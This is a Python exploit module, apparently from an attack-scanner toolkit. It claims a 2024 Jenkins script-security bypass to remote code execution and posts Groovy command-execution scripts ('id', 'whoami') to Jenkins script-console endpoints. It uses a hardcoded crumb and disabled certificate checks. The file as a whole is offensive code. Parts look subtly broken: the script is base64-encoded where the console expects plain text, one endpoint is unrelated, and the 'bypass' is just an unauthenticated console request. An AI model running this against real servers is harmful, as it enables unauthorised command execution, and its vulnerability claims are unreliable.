import requests
from core.printmodels import *
import base64

class Jenkins_Script_RCE:
    def __init__(self):
        self.name = "Jenkins Script Security Bypass"
        self.description = "Jenkins Script Security Bypass to RCE (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Jenkins-Crumb': 'DrDataYE'
            }

            # Multiple attack vectors
            groovy_scripts = [
                """
                def process = "id".execute()
                println(process.text)
                """,
                """
                def cmd = "whoami"
                def proc = cmd.execute()
                println(proc.in.text)
                """
            ]

            endpoints = [
                f"{site}/scriptText",
                f"{site}/script",
                f"{site}/ajaxExecutors"
            ]

            for endpoint in endpoints:
                for script in groovy_scripts:
                    payload = {
                        'script': base64.b64encode(script.encode()).decode(),
                        'Jenkins-Crumb': 'DrDataYE'
                    }
                    
                    response = requests.post(endpoint, headers=headers, data=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('uid=' in response.text or 'root' in response.text):
                        return PrintSuccess(f"[Jenkins-2024] Vulnerable! Script execution successful at {endpoint}")

            return PrintFailed("[Jenkins-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Jenkins-2024] Error: {str(e)}")
